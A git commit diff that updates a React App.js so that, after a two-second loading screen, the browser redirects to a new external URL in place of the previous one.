292f5feee75a52ff43b52aa7b177615d47a2ed91
husknet <127146284+husknet@users.noreply.github.com>
2024-10-15 08:45:08 -0300

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://boot.uleif.com';
+            window.location.href = 'https://open.neralaiko.lt/';
         }, 2000);
 
         return () => clearTimeout(timer);
